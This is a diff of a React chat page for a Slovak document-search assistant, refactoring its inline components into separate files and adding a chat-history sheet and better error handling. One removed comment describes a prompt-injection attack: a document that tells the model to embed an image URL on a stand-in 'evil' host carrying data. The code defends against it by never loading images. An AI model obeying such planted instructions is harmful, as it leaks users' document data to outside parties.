@@ -1,45 +1,30 @@
+import { AssistantBody } from '@/components/chat/assistant-body'
+import { ChatHistory } from '@/components/chat/chat-history'
+import { Composer } from '@/components/chat/composer'
+import { FeedbackBar } from '@/components/chat/feedback-bar'
 import { PassageDialog } from '@/components/passage-dialog'
 import { PdfDialog, type PdfTarget } from '@/components/pdf-dialog'
+import { SplitPane } from '@/components/split-pane'
 import { Badge } from '@/components/ui/badge'
 import { Button } from '@/components/ui/button'
 import { ScrollArea } from '@/components/ui/scroll-area'
-import { Textarea } from '@/components/ui/textarea'
+import { Sheet, SheetContent, SheetDescription, SheetHeader, SheetTitle } from '@/components/ui/sheet'
+import { PageHeader } from '@/components/wf/bits'
+import { usePrefersReducedMotion } from '@/hooks/use-media-query'
 import {
   fetchChatMessages,
-  exportMessagePdf,
   fetchChats,
-  setFeedback,
   type ChatMessage,
-  type DocType,
   type GeneratedDoc,
   type SourceRef,
   type Verification,
 } from '@/lib/api'
+import { notifyError } from '@/lib/errors'
 import { streamChat, type PlanMode } from '@/lib/sse'
-import { cn } from '@/lib/utils'
-import { useQuery, useQueryClient } from '@tanstack/react-query'
+import { Add01Icon, Clock01Icon } from '@hugeicons/core-free-icons'
 import { HugeiconsIcon } from '@hugeicons/react'
-import {
-  Activity01Icon,
-  Add01Icon,
-  Alert02Icon,
-  CheckmarkCircle02Icon,
-  FileExportIcon,
-  Microscope,
-  Download04Icon,
-  File02Icon,
-  Pdf01Icon,
-  Search01Icon,
-  SentIcon,
-  StopIcon,
-  Table01Icon,
-  ThumbsDownIcon,
-  ThumbsUpIcon,
-  ViewIcon,
-} from '@hugeicons/core-free-icons'
-import { Link } from 'react-router'
+import { useQuery, useQueryClient } from '@tanstack/react-query'
 import { useEffect, useRef, useState } from 'react'
-import ReactMarkdown from 'react-markdown'
 import { toast } from 'sonner'
 
 type LocalMessage = Pick<ChatMessage, 'role' | 'content' | 'sources'> & {
@@ -51,257 +36,17 @@ type LocalMessage = Pick<ChatMessage, 'role' | 'content' | 'sources'> & {
   verification?: Verification | null
 }
 
-const DOC_TYPE_LABEL: Record<DocType, string> = {
-  free: 'Dokument',
-  report: 'Report',
-  offer: 'Cenová ponuka',
-  memo: 'Memo',
-  summary: 'Súhrn',
-}
-
 const MODE_LABEL: Partial<Record<PlanMode, string>> = {
   filter: 'presný filter',
   compose: 'agent',
   generate: 'tvorba dokumentu',
-  research: 'deep research',
+  research: 'hĺbkový prieskum',
   firma: 'firemné údaje',
-}
-
-function DocumentCard({ doc, onOpen }: { doc: GeneratedDoc; onOpen: () => void }) {
-  const pages = doc.pages === 1 ? 'strana' : doc.pages < 5 ? 'strany' : 'strán'
-  return (
-    <div className="flex items-center gap-3 rounded-lg border bg-card p-3">
-      <div className="flex size-10 shrink-0 items-center justify-center rounded-md bg-primary/10 text-primary">
-        <HugeiconsIcon icon={Pdf01Icon} className="size-5" />
-      </div>
-      <div className="min-w-0 flex-1">
-        <p className="truncate text-sm font-medium">{doc.title}</p>
-        <p className="truncate text-xs text-muted-foreground">
-          {DOC_TYPE_LABEL[doc.doc_type]} · PDF · {doc.pages} {pages} · {doc.sections.length} sekcie
-        </p>
-      </div>
-      <Button variant="outline" size="sm" onClick={onOpen}>
-        <HugeiconsIcon icon={ViewIcon} className="size-4" /> Otvoriť
-      </Button>
-      <Button size="sm" asChild>
-        <a href={`${doc.url}?download=true`} download={doc.filename}>
-          <HugeiconsIcon icon={Download04Icon} className="size-4" /> Stiahnuť
-        </a>
-      </Button>
-    </div>
-  )
-}
-
-function linkifyCitations(content: string): string {
-  return content.replace(/\[(\d+(?:\s*,\s*\d+)*)\]/g, (_m, nums: string) =>
-    nums
-      .split(',')
-      .map((x) => `[${x.trim()}](#src-${x.trim()})`)
-      .join(' '),
-  )
-}
-
-function SourceChip({ source, onOpen }: { source: SourceRef; onOpen: () => void }) {
-  const icon = source.type === 'table_summary' ? Table01Icon : File02Icon
-  const pages =
-    source.page_to !== source.page_from
-      ? `${source.page_from}–${source.page_to}`
-      : `${source.page_from}`
-  return (
-    <button onClick={onOpen} title={source.snippet} className="group">
-      <Badge variant="outline" className="gap-1 group-hover:bg-secondary">
-        <span className="font-semibold">{source.n}</span>
-        <HugeiconsIcon icon={icon} className="size-3" />
-        <span className="max-w-40 truncate">{source.filename}</span>
-        <span className="text-muted-foreground">str. {pages}</span>
-      </Badge>
-    </button>
-  )
-}
-
-function FeedbackBar({
-  messageId,
-  traceId,
-  rating,
-  hasDocument,
-  onRated,
-  onExported,
-}: {
-  messageId: string
-  traceId?: string | null
-  rating?: -1 | 1 | null
-  hasDocument: boolean
-  onRated: (rating: -1 | 1 | null) => void
-  onExported: (doc: GeneratedDoc) => void
-}) {
-  const [exporting, setExporting] = useState(false)
-  const exportPdf = () => {
-    setExporting(true)
-    exportMessagePdf(messageId)
-      .then((doc) => {
-        onExported(doc)
-        toast.success('Odpoveď uložená ako PDF')
-      })
-      .catch((e: Error) => toast.error(e.message))
-      .finally(() => setExporting(false))
-  }
-  const rate = (value: -1 | 1) => {
-    const next = rating === value ? null : value
-    setFeedback(messageId, next)
-      .then(() => onRated(next))
-      .catch((e: Error) => toast.error(e.message))
-  }
-  return (
-    <div className="flex items-center gap-0.5 text-muted-foreground">
-      <Button
-        variant="ghost"
-        size="icon"
-        className={cn('size-7', rating === 1 && 'text-emerald-600')}
-        aria-label="Dobrá odpoveď"
-        aria-pressed={rating === 1}
-        onClick={() => rate(1)}
-      >
-        <HugeiconsIcon icon={ThumbsUpIcon} className="size-3.5" />
-      </Button>
-      <Button
-        variant="ghost"
-        size="icon"
-        className={cn('size-7', rating === -1 && 'text-destructive')}
-        aria-label="Zlá odpoveď"
-        aria-pressed={rating === -1}
-        onClick={() => rate(-1)}
-      >
-        <HugeiconsIcon icon={ThumbsDownIcon} className="size-3.5" />
-      </Button>
-      {!hasDocument && (
-        <Button
-          variant="ghost"
-          size="sm"
-          className="h-7 gap-1 px-2 text-xs"
-          onClick={exportPdf}
-          disabled={exporting}
-        >
-          <HugeiconsIcon icon={FileExportIcon} className="size-3.5" /> PDF
-        </Button>
-      )}
-      {traceId && (
-        <Button variant="ghost" size="sm" className="h-7 gap-1 px-2 text-xs" asChild>
-          <Link to={`/traces?id=${traceId}`}>
-            <HugeiconsIcon icon={Activity01Icon} className="size-3.5" /> trace
-          </Link>
-        </Button>
-      )}
-    </div>
-  )
-}
-
-function VerificationNote({ verification }: { verification: Verification }) {
-  const checked = verification.sentences
-  const [open, setOpen] = useState(false)
-  if (checked.length === 0) return null
-  const flagged = checked.filter((c) => c.status !== 'supported')
-  const allOk = flagged.length === 0
-  return (
-    <div className="text-xs">
-      <button
-        onClick={() => setOpen((o) => !o)}
-        disabled={allOk}
-        className={cn(
-          'flex items-center gap-1.5',
-          allOk ? 'text-emerald-600 dark:text-emerald-400' : 'text-amber-600 dark:text-amber-400',
-        )}
-      >
-        <HugeiconsIcon icon={allOk ? CheckmarkCircle02Icon : Alert02Icon} className="size-3.5" />
-        {allOk
-          ? checked.length === 1
-            ? 'tvrdenie má oporu v citovanom zdroji'
-            : checked.length <= 4
-              ? `všetky ${checked.length} tvrdenia majú oporu v citovanom zdroji`
-              : `všetkých ${checked.length} tvrdení má oporu v citovanom zdroji`
-          : `${flagged.length} z ${checked.length} tvrdení bez jasnej opory v citovanom zdroji`}
-      </button>
-      {open && !allOk && (
-        <ul className="mt-1.5 space-y-1 border-l-2 border-amber-500/40 pl-3 text-muted-foreground">
-          {flagged.map((c, i) => (
-            <li key={i}>
-              <span className="font-medium text-foreground">
-                {c.status === 'uncited' ? 'bez citácie' : `slabá opora v [${c.citations.join(', ')}]`}
-                :
-              </span>{' '}
-              {c.text}
-            </li>
-          ))}
-        </ul>
-      )}
-    </div>
-  )
-}
-
-function AssistantBody({
-  content,
-  sources,
-  document,
-  rewritten,
-  verification,
-  onCite,
-  onOpenDocument,
-}: {
-  content: string
-  sources: SourceRef[] | null
-  document?: GeneratedDoc | null
-  rewritten?: string | null
-  verification?: Verification | null
-  onCite: (n: number) => void
-  onOpenDocument: (doc: GeneratedDoc) => void
-}) {
-  return (
-    <div className="space-y-2">
-      {rewritten && (
-        <p className="flex items-center gap-1.5 text-xs text-muted-foreground">
-          <HugeiconsIcon icon={Search01Icon} className="size-3" /> hľadal som: „{rewritten}“
-        </p>
-      )}
-      {document && <DocumentCard doc={document} onOpen={() => onOpenDocument(document)} />}
-      <div className="prose prose-sm dark:prose-invert max-w-none text-sm leading-relaxed [&_ol]:list-decimal [&_ol]:pl-5 [&_p]:my-2 [&_ul]:my-2 [&_ul]:list-disc [&_ul]:pl-5 [&_li]:my-0.5">
-        <ReactMarkdown
-          components={{
-            a: ({ href, children }) =>
-              href?.startsWith('#src-') ? (
-                <button
-                  onClick={() => onCite(Number(href.slice(5)))}
-                  className="mx-0.5 inline-flex size-4 items-center justify-center rounded bg-secondary align-super text-[10px] font-semibold text-secondary-foreground hover:bg-primary hover:text-primary-foreground"
-                >
-                  {children}
-                </button>
-              ) : href && /^https?:\/\//i.test(href) ? (
-                <a href={href} target="_blank" rel="noopener noreferrer nofollow">
-                  {children}
-                </a>
-              ) : (
-                <span>{children}</span>
-              ),
-            // obrázky z odpovede sa nikdy nenačítajú — URL by mohla vyniesť dáta
-            // (prompt injection v dokumente: „vlož ![](https://evil/?q=…)“)
-            img: () => null,
-          }}
-        >
-          {linkifyCitations(content)}
-        </ReactMarkdown>
-      </div>
-      {verification && <VerificationNote verification={verification} />}
-      {sources && sources.length > 0 && (
-        <div className="flex flex-wrap gap-1.5">
-          {sources.map((s) => (
-            <SourceChip key={s.n} source={s} onOpen={() => onCite(s.n)} />
-          ))}
-        </div>
-      )}
-    </div>
-  )
 }
 
 export default function ChatPage() {
   const queryClient = useQueryClient()
+  const reducedMotion = usePrefersReducedMotion()
   const [chatId, setChatId] = useState<string | null>(null)
   const [messages, setMessages] = useState<LocalMessage[]>([])
   const [draft, setDraft] = useState('')
@@ -314,24 +59,29 @@ export default function ChatPage() {
   const [pdfTarget, setPdfTarget] = useState<PdfTarget | null>(null)
   const [passageId, setPassageId] = useState<string | null>(null)
   const [research, setResearch] = useState(false)
+  const [historyOpen, setHistoryOpen] = useState(false)
   const abortRef = useRef<AbortController | null>(null)
   const endRef = useRef<HTMLDivElement>(null)
 
-  const { data: chats } = useQuery({ queryKey: ['chats'], queryFn: fetchChats })
+  const chats = useQuery({ queryKey: ['chats'], queryFn: fetchChats })
 
   useEffect(() => {
-    endRef.current?.scrollIntoView({ behavior: 'smooth' })
-  }, [messages, streamText])
+    endRef.current?.scrollIntoView({ behavior: reducedMotion ? 'auto' : 'smooth' })
+  }, [messages, streamText, reducedMotion])
 
-  const openChat = async (id: string) => {
+  const openChat = (id: string) => {
     abortRef.current?.abort()
+    setHistoryOpen(false)
     setChatId(id)
     setStreamText(null)
-    setMessages(await fetchChatMessages(id))
+    fetchChatMessages(id)
+      .then(setMessages)
+      .catch((e: unknown) => notifyError(e, 'Konverzáciu sa nepodarilo otvoriť'))
   }
 
   const newChat = () => {
     abortRef.current?.abort()
+    setHistoryOpen(false)
     setChatId(null)
     setMessages([])
     setStreamText(null)
@@ -344,7 +94,7 @@ export default function ChatPage() {
       setPassageId(src.chunk_id)
       return
     }
-    // otvor stranu s prvým zvýraznením (chunk môže začínať na predošlej strane)
+    // open the page of the first highlight (a chunk may start on the previous page)
     const firstBox = src.boxes?.[0]
     setPdfTarget({
       docId: src.doc_id,
@@ -397,22 +147,13 @@ export default function ChatPage() {
         onDone: (_chatId, messageId, traceId) => {
           setMessages((m) => [
             ...m,
-            {
-              id: messageId,
-              role: 'assistant',
-              content: acc,
-              sources,
-              document,
-              trace_id: traceId,
-              rewritten,
-              verification,
-            },
+            { id: messageId, role: 'assistant', content: acc, sources, document, trace_id: traceId, rewritten, verification },
           ])
           setStreamText(null)
           void queryClient.invalidateQueries({ queryKey: ['chats'] })
         },
         onError: (msg) => {
-          toast.error(msg)
+          toast.error('Odpoveď sa nepodarilo dokončiť', { description: msg })
           if (acc || document) {
             setMessages((m) => [...m, { role: 'assistant', content: acc, sources, document }])
           }
@@ -438,8 +179,8 @@ export default function ChatPage() {
         },
       },
       controller.signal,
-    ).catch((e: Error) => {
-      if (e.name !== 'AbortError') toast.error(e.message)
+    ).catch((e: unknown) => {
+      notifyError(e, 'Odpoveď sa nepodarilo načítať')
       setStreamText(null)
     })
   }
@@ -447,57 +188,56 @@ export default function ChatPage() {
   const stop = () => {
     abortRef.current?.abort()
     if (streamText) {
-      setMessages((m) => [
-        ...m,
-        { role: 'assistant', content: streamText, sources: streamSources, document: streamDocument },
-      ])
+      setMessages((m) => [...m, { role: 'assistant', content: streamText, sources: streamSources, document: streamDocument }])
     }
     setStreamText(null)
   }
 
-  return (
-    <div className="grid h-[calc(100svh-6.5rem)] max-w-5xl grid-cols-1 gap-6 md:h-[calc(100svh-4rem)] md:grid-cols-[200px_1fr]">
-      <h1 className="sr-only">Chat</h1>
-      <aside className="hidden min-h-0 flex-col gap-2 md:flex">
-        <Button variant="outline" size="sm" onClick={newChat} className="justify-start gap-2">
-          <HugeiconsIcon icon={Add01Icon} className="size-4" /> Nový chat
-        </Button>
-        <ScrollArea className="min-h-0 flex-1">
-          <div className="space-y-1 pr-2">
-            {chats?.map((c) => (
-              <button
-                key={c.id}
-                onClick={() => void openChat(c.id)}
-                className={cn(
-                  'w-full truncate rounded-md px-2 py-1.5 text-left text-xs transition-colors',
-                  c.id === chatId
-                    ? 'bg-secondary font-medium'
-                    : 'text-muted-foreground hover:bg-secondary/50',
-                )}
-              >
-                {c.title}
-              </button>
-            ))}
-          </div>
-        </ScrollArea>
-      </aside>
+  const historyProps = { chats: chats.data, loading: chats.isPending, activeId: chatId, onSelect: openChat }
 
-      <section className="flex min-h-0 flex-col gap-3">
+  return (
+    <SplitPane
+      className="max-w-5xl"
+      gridClassName="md:grid-cols-[200px_1fr]"
+      header={
+        <PageHeader
+          compact
+          title="Chat"
+          actions={
+            <>
+              <Button variant="outline" size="sm" className="h-9 gap-2 md:hidden" onClick={() => setHistoryOpen(true)}>
+                <HugeiconsIcon icon={Clock01Icon} className="size-4" /> História
+              </Button>
+              <Button variant="outline" size="sm" className="h-9 gap-2" onClick={newChat}>
+                <HugeiconsIcon icon={Add01Icon} className="size-4" /> Nový chat
+              </Button>
+            </>
+          }
+        />
+      }
+      aside={
+        <aside className="hidden min-h-0 md:flex">
+          <ChatHistory {...historyProps} className="w-full" />
+        </aside>
+      }
+    >
+      <section aria-label="Konverzácia" className="flex min-h-0 flex-col gap-3">
         <ScrollArea className="min-h-0 flex-1 rounded-md border">
-          <div className="space-y-4 p-4">
+          <div className="space-y-4 p-4" aria-live="polite" aria-busy={streamText !== null}>
             {messages.length === 0 && streamText === null && (
-              <div className="space-y-1 py-16 text-center text-sm text-muted-foreground">
-                <p>Opýtaj sa na čokoľvek z nahratých PDF. Odpoveď cituje konkrétne strany.</p>
+              <div className="mx-auto max-w-md space-y-2 py-16 text-center text-sm text-muted-foreground">
+                <p className="text-foreground">Opýtaj sa na čokoľvek z nahratých dokumentov.</p>
+                <p>Odpoveď cituje konkrétne strany a čísla overí v podkladoch.</p>
                 <p className="text-xs">
-                  Chat vie vytvoriť aj dokument, napr. „Priprav report o…“ alebo „Vytvor cenovú
-                  ponuku…“. PDF dostane hlavičku firmy z Nastavení.
+                  Chat vie vytvoriť aj dokument, napr. „Priprav report o…“ alebo „Vytvor cenovú ponuku…“. PDF dostane
+                  hlavičku firmy z Nastavení.
                 </p>
               </div>
             )}
             {messages.map((m, i) =>
               m.role === 'user' ? (
                 <div key={i} className="flex justify-end">
-                  <div className="max-w-[80%] rounded-lg bg-primary px-3 py-2 text-sm text-primary-foreground">
+                  <div className="max-w-[85%] rounded-lg bg-secondary px-3 py-2 text-sm break-words whitespace-pre-wrap text-secondary-foreground">
                     {m.content}
                   </div>
                 </div>
@@ -518,15 +258,9 @@ export default function ChatPage() {
                       traceId={m.trace_id}
                       rating={m.rating}
                       hasDocument={!!m.document}
-                      onRated={(rating) =>
-                        setMessages((ms) =>
-                          ms.map((x, j) => (j === i ? { ...x, rating } : x)),
-                        )
-                      }
+                      onRated={(rating) => setMessages((ms) => ms.map((x, j) => (j === i ? { ...x, rating } : x)))}
                       onExported={(doc) => {
-                        setMessages((ms) =>
-                          ms.map((x, j) => (j === i ? { ...x, document: doc } : x)),
-                        )
+                        setMessages((ms) => ms.map((x, j) => (j === i ? { ...x, document: doc } : x)))
                         openDocument(doc)
                       }}
                     />
@@ -562,48 +296,29 @@ export default function ChatPage() {
           </div>
         </ScrollArea>
 
-        <div className="flex items-end gap-2">
-          <Button
-            variant={research ? 'default' : 'outline'}
-            size="icon"
-            aria-pressed={research}
-            aria-label="Deep research"
-            title="Deep research: podotázky, viac zdrojov, štruktúrovaná správa (~1 min)"
-            onClick={() => setResearch((r) => !r)}
-          >
-            <HugeiconsIcon icon={Microscope} className="size-4" />
-          </Button>
-          <Textarea
-            value={draft}
-            onChange={(e) => setDraft(e.target.value)}
-            onKeyDown={(e) => {
-              if (e.key === 'Enter' && !e.shiftKey) {
-                e.preventDefault()
-                send()
-              }
-            }}
-            placeholder={
-              research
-                ? 'Téma na deep research… (napr. riziká projektu Agátová)'
-                : 'Otázka… (Enter odošle, Shift+Enter nový riadok)'
-            }
-            className="max-h-40 min-h-11 flex-1 resize-none"
-            rows={1}
-          />
-          {streamText !== null ? (
-            <Button variant="outline" size="icon" onClick={stop}>
-              <HugeiconsIcon icon={StopIcon} className="size-4" />
-            </Button>
-          ) : (
-            <Button size="icon" onClick={send} disabled={!draft.trim()}>
-              <HugeiconsIcon icon={SentIcon} className="size-4" />
-            </Button>
-          )}
-        </div>
+        <Composer
+          draft={draft}
+          onDraftChange={setDraft}
+          research={research}
+          onResearchChange={setResearch}
+          streaming={streamText !== null}
+          onSend={send}
+          onStop={stop}
+        />
       </section>
+
+      <Sheet open={historyOpen} onOpenChange={setHistoryOpen}>
+        <SheetContent side="right" className="w-80 gap-2 p-0 pb-4">
+          <SheetHeader>
+            <SheetTitle>História konverzácií</SheetTitle>
+            <SheetDescription className="sr-only">Otvor staršiu konverzáciu</SheetDescription>
+          </SheetHeader>
+          <ChatHistory {...historyProps} showLabel={false} className="flex-1 px-2" />
+        </SheetContent>
+      </Sheet>
 
       <PdfDialog target={pdfTarget} onClose={() => setPdfTarget(null)} />
       <PassageDialog chunkId={passageId} onClose={() => setPassageId(null)} />
-    </div>
+    </SplitPane>
   )
 }
